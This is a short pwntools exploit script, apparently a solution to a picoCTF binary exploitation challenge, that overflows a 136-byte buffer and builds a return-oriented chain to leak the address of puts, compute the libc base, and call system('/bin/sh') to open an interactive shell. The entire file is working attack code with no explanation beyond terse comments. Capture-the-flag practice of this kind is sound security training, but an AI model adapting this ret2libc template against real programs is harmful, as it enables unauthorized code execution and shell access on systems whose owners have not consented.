from pwn import *

p=process("./vuln_patched")
#lsp=remote("mercury.picoctf.net", 23584)

# %%
elf=ELF("./vuln_patched")
libc=ELF("./libc.so.6")

payload=b"A"*136
payload+=p64(0x00400913) # pop rdi
payload+=p64(elf.got['puts'])
payload+=p64(elf.plt['puts'])
payload+=p64(elf.symbols['main'])

p.sendline(payload)

p.recvline()
p.recvline()

# print(len(p.recvline()))
#addr=u64(p.recvline().ljust(8,b"\x00"))
addr=u64(p.recv(6).ljust(8,b"\x00"))
# print("a : " +hex(addr))


libc_base=addr-libc.symbols['puts']
# print("static offset : ")
# print(hex(libc.symbols['puts']))
# print(hex(libc_base))

# print("/bin/sh")
# print(hex(next(libc.search(b"/bin/sh"))))
payload=b"A"*136
#payload+=p64(0x0040052e) # ret
payload+=p64(0x00400913) # pop rdi
payload+=p64(libc_base+next(libc.search(b"/bin/sh")))
payload+=p64(0x0040052e) # ret, this also workes well. Align the stack to 16 bytes otherwise system() will crash
payload+=p64(libc_base+libc.symbols['system'])
p.sendline(payload)
p.interactive()